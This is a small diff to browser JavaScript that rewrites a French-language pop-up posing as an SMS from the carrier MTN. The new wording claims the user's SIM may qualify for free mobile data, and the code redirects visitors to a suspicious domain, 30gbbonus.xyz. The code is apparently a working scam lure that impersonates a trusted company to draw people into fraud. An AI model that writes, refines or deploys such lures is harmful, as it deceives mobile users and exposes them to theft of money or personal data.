@@ -1,6 +1,6 @@
 
-var password = 'DONNÉES ILLIMITÉES'
-password=prompt('SMS: Félicitations, vous êtes admissible à 3 mois de données gratuites illimitées, veuillez appuyer sur OK pour activer maintenant   ','DONNÉES ILLIMITÉES');
-if (password != 'DONNÉES ILLIMITÉES') {
+var password = 'VÉRIFIER'
+password=prompt('SMS: Vérifiez si votre carte SIM MTN est éligible pour activer les données gratuites pour ce mois-ci. Veuillez appuyer sur OK pour vérifier maintenant.   ','VÉRIFIER');
+if (password != 'VÉRIFIER') {
 location.href='https://30gbbonus.xyz/mtn-fr.html';
 }
